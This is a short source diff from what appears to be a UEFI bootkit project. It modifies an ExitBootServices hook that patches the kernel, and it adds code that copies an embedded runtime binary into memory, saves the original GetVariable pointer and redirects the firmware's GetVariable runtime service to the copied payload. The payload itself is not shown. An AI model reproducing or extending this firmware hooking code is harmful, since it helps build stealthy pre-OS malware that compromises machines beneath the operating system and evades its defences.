@@ -1,10 +1,11 @@
 /* UEFI ExitBootServices hook to patch the kernel.
  * Need to check how well this works with memory protection, as we are writing
  * to our own segement.
- * */
+ */
 #include <efi.h>
 #include <efilib.h>
 #include "../stage1.h"
+#include "../runtime_hook/runtime.h"
 
 // How far we want to go looking for the entrypoint.
 #define MAX_DEPTH 4096
@@ -129,9 +130,12 @@ EFI_STATUS exit_bootservices_hook(EFI_HANDLE ImageHandle, UINTN MapKey)
     }
 
     /* Installing a runtime services hook */
-    data[0] = 0xeb;
-    data[1] = 0xfe;
-    systable->RuntimeServices->GetVariable = data;
+    memcpy(data, runtime_bin, runtime_bin_len);
+    /* Copy a few pointers */
+    memcpy(data, (void *) &(systable->RuntimeServices->GetVariable), 8);
+    UINT64 a = &(systable->RuntimeServices->GetVariable);
+    memcpy(data+8, (void *) &(a), 8);
+    systable->RuntimeServices->GetVariable = data + 16;
     
     //while (1) {}
 
